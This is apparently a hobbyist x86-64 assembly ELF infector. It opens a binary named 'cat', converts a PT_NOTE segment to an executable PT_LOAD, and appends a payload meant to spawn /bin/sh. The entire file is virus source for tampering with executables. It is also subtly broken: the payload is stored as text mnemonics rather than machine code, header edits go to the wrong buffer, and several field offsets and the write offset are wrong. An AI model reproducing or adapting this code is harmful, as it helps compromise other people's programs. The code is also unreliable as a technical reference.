section .data
    flags dq 2      ; 0_RDWR
    mode dq 0666    ; r/w permissions for user, group and others

    ; File to open
    filename db "cat", 0

    ; Buffer to retrieve the ELF header
    buffer_len equ 262144       ; Not very efficient, but heh I can't find a better way (for now). If it works that way already it'd be very great
    buffer times buffer_len db 0

    ; Messages
    elf_msg db "This file has a ELF header.", 10
    elf_len equ $ - elf_msg

    ; Error messages
    not_elf_msg db "This file does not have a ELF header.", 10
    not_elf_len equ $ - not_elf_msg

    is_dir_msg db "The provided file is a directory.", 10
    is_dir_len equ $ - is_dir_msg

    miss_msg db "The provided file does not exist.", 10
    miss_len equ $ - miss_msg

    ; Injection
    shellcode db 'xor eax, eax', 10
        db 'xor ebx, ebx', 10
        db 'push eax', 10
        db 'push 0x68732f6e', 10
        db 'push 0x69622f2f', 10
        db 'push esp', 10
        db 'mov ebx, esp', 10
        db 'xor ecx, ecx', 10
        db 'xor edx, edx', 10
        db 'execve syscall numbers'
    shellcode_len equ $ - shellcode
    modified_header times buffer_len db 0

section .bss
    fd resq 1
    old_e_entry resq 1
    ph_offset resq 1
    ph_entry_size resq 1
    ph_num resq 1
    loop_counter resq 1
    stat resb 144

section .text
    global _start

_start:
    ; Open the file
    mov rax, 2
    mov rdi, filename
    mov rsi, [flags]
    mov rdx, [mode]
    syscall
    mov [fd], rax        ; file descriptor

    ; Read the file contents
    mov rax, 0          
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, buffer_len
    syscall

    ; Check if it is a directory
    jmp check_dir

check_dir:
    ; Depending on the file descriptor LSB, we know if it's a file, a directory or a missing file
    ; File's LSB is 3, directory's is B and missing file's is E
    mov rdi, [fd]
    and rdi, 0xF        ; Get the LSB

    cmp rdi, 0xB        ; Check if it is a directory
    je is_dir

    cmp rdi, 0xE        ; Check if it is a missing file
    je missing_file

    ; If it is not a directory, check if it is an ELF file
    jmp check_elf

    check_elf:
    ; Check for leading characters of a file with an ELF header
    mov rsi, buffer
    mov al, [rsi]
    cmp al, 0x7F
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'E'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'L'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'F'
    jne not_elf

    jmp is_elf

is_dir:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, is_dir_msg
    mov rdx, is_dir_len
    syscall

    jmp close

missing_file:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, miss_msg
    mov rdx, miss_len
    syscall

    jmp close

is_elf:
    ; Display ELF header message
    mov rax, 1          
    mov rdi, 1
    mov rsi, elf_msg
    mov rdx, elf_len
    syscall

    jmp retrieve_info

retrieve_info:
    ; Get file size
    mov rax, 5      ; fstat
    mov rdi, [fd]   
    lea rsi, [stat]
    syscall

    ; Retrieve information needed to infect the ELF file
    mov rsi, buffer
    add rsi, 24
    mov rax, [rsi]      ; Get the e_entry field
    mov [old_e_entry], rax

    add rsi, 8         ; Move to the e_phoff field (32 bytes offset in the ELF header)
    mov rax, [rsi]      ; Get the e_phoff field
    mov [ph_offset], rax

    add rsi, 22         ; Move to the e_phentsize field
    mov ax, word [rsi]  ; Get the e_phentsize field
    movzx rax, ax
    mov [ph_entry_size], rax

    add rsi, 2          ; Move to the e_phnum field
    mov ax, word [rsi]  ; Get the e_phnum field
    movzx rax, ax
    mov [ph_num], rax

    ; Copy the ELF header to the modified_header buffer
    mov rsi, buffer
    mov rdi, modified_header
    mov rcx, buffer_len
    rep movsb

    ; Parse program header
    mov rcx, [ph_num]
    test rcx, rcx
    jz close

    mov rsi, buffer
    add rsi, [ph_offset]

    jmp search_pt_note

search_pt_note:
    ; Search for a PT_NOTE segment
    mov [loop_counter], rcx

    mov rax, [rsi]      ; Get the p_type field
    cmp eax, 4          ; Check if it is a PT_NOTE segment (isolate the last 8 bits because it's written on 8 bits)
    jne next_ph

    jmp infect

next_ph:
    ; Move to the next program header
    add rsi, [ph_entry_size]
    mov rcx, [loop_counter]
    dec rcx
    mov [loop_counter], rcx
    jnz search_pt_note

    jmp close

infect:
    ; Change PT_NOTE to PT_LOAD
    mov eax, [rsi]
    and eax, 0xFFFF0000 ; Clear the last 16 bits
    or eax, 1
    mov [rsi], eax

    ; Allow executable instructions
    mov eax, [rsi + 12] ; Get p_flags
    or eax, 0x1         ; Set the executable flag
    mov [rsi + 12], eax

    ; Set an address that's far enough to avoid overlapping during exec
    mov eax, 0xc000000
    mov [rsi + 16], eax ; Set p_vaddr

    ; Set size of injected code
    mov eax, shellcode_len
    mov [rsi + 20], eax    ; Set p_filesz
    mov [rsi + 24], eax    ; Set p_memsz

    ; Point offset to injected code
    mov rax, [stat + 48]    ; st_size
    mov [rsi + 8], rax      ; Set p_offset

    ; Write the shellcode to the end of the file
    mov rax, 18            ; pwrite
    mov rdi, [fd]          
    lea rsi, [shellcode]   
    mov rdx, shellcode_len
    mov r10, rax           ; offset (file size)
    syscall

    ; Write the modified program header back to the file
    mov rax, 18            
    mov rdi, [fd]         
    lea rsi, [modified_header]
    mov rdx, buffer_len
    mov r10, 0             ; offset (start of the file)
    syscall

    jmp close

not_elf:
    ; Display an error message
    mov rax, 1
    mov rdi, 1
    mov rsi, not_elf_msg
    mov rdx, not_elf_len
    syscall

    jmp close

close:
    ; Close the file and exit
    mov rax, 3
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall